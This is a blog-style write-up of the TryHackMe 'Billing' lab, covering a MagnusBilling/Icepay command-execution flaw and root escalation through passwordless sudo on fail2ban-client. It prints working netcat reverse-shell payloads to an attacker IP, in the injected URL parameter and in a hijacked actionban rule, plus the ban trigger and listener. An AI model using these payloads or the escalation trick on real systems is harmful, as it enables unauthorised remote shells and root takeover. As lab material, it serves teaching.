---
layout: ../../layouts/BlogLayout.astro
title: "Billing THM write-up"
date: "FEB 02, 2026"
readTime: "10 MIN READ"
author: "Harsha"
category: "cyber"
---

## Introduction

**Billing** is an engaging easy-difficulty boot-to-root challenge on TryHackMe. The room showcases how a hidden directory exposing sensitive third-party software components can lead to Remote Code Execution (RCE). Furthermore, it features a creative privilege escalation vector that exploits a misconfigured **Fail2Ban** installation where a user has `sudo` rights over the client binary.

## The Attack Chain At-A-Glance

Plaintext

```
Nmap Scan (Ports 22, 80, 3306)
       ↓
Discover `/mbilling/` & Hidden `/lib/` Directory via robots.txt
       ↓
Identify Vulnerable Icepay Module → Achieve RCE (www-data / asterisk)
       ↓
Enumerate Sudo Rights (`sudo -l` reveals NOPASSWD for fail2ban-client)
       ↓
Modify Fail2Ban `actionban` Config to Run a Reverse Shell Payload
       ↓
Ban Localhost (127.0.0.1) → Trigger Payload Execution → Get Root Shell
```

## Phase 1: Reconnaissance & Initial Foothold (`www-data`)

### 1. Network Scanning

An initial infrastructure scan using `nmap` reveals three open ports:

- **Port 22 (SSH):** OpenSSH 8.4p1
    
- **Port 80 (HTTP):** Apache 2.4.56 hosting a web platform
    
- **Port 3306 (MySQL):** MariaDB instance (Access Unauthorized)
    

Checking the web server's `robots.txt` file hints at a sensitive directory path: `/mbilling/`.

### 2. Directory Harvesting & Exploit Selection

Navigating to `/mbilling/` shows the application is running **MagnusBilling**. Further automated crawling or manual directory fuzzing reveals a exposed library subfolder at `/mbilling/lib/`, which houses an integrated payment utility tracking system using **Icepay**.

This specific module handles incoming parameters unsafely, exposing a direct **Remote Command Execution (RCE)** vulnerability.

### 3. Catching the Initial Shell

By sending a URL-encoded payload directly to the vulnerable endpoint parameter, we can force the system backend to call out via Netcat:

Plaintext

```
nc%20-e%20/bin/bash%20192.168.135.178%204444
```

With a local netcat listener open on port `4444`, the execution triggers seamlessly, dropping us into a shell environment as the web application process user (`www-data` or `asterisk`).

- **USER FLAG Captured!**
    

## Phase 2: System Enumeration

To plan vertical escalation pathing, running `sudo -l` reveals a powerful misconfiguration in the sudoers policy:

Plaintext

```
User asterisk may run the following commands on target:
(root) NOPASSWD: /usr/bin/fail2ban-client *
```

The system allows the user to interact directly with the **Fail2Ban** client suite with root privileges without requiring a password. Fail2Ban is an intrusion prevention framework that blocks malicious IP addresses by altering local firewall profiles.

## Phase 3: Privilege Escalation (`root`)

Because we possess full administrative controls over `fail2ban-client`, we can dynamically reconfigure the parameters that determine what the service actually _does_ when it decides to ban an offender.

### 1. Hijacking the Ban Action

Rather than letting Fail2Ban run its traditional `iptables` rules to drop traffic, we can inject a reverse shell command into the `actionban` configuration rule for a specific operational jail (like the `sshd` jail):

Bash

```
sudo fail2ban-client set sshd actionban "nc -e /bin/bash 192.168.135.178 5555"
```

This instruction alters the runtime engine. The moment a ban trigger trips, the server will execute our custom reverse shell script under the context of the core system daemon—which runs as **root**.

### 2. Triggering the Exploit

To force the modified action rule to run immediately without needing to wait for a real external attack, we can use the client utility to manually ban an address.

Banning the loopback address (`127.0.0.1`) forces the local service instance to process the event instantly:

Bash

```
sudo fail2ban-client set sshd banip 127.0.0.1
```

### 3. Capturing Root

Over on our attack machine, we establish a separate listener to capture the secondary stage hook:

Bash

```
nc -lnvp 5555
```

As soon as the manual local ban command finishes processing, Fail2Ban executes the forged `actionban` rule, establishing a connection back to our listening shell with complete **root** authority.

- **ROOT FLAG Captured! Room Complete!**
    

## Summary & Key Takeaways

1. **Sanitize Directory Permissions:** Exposing application libraries and module trees (`/lib/`) under public directory paths increases the threat landscape significantly.
    
2. **Review Wildcard Sudo Entries Safely:** Granting passwordless access to toolsets like `fail2ban-client` using wildcards (`*`) permits configuration tampering, effectively removing the security boundaries separating low-privilege service managers and root space.
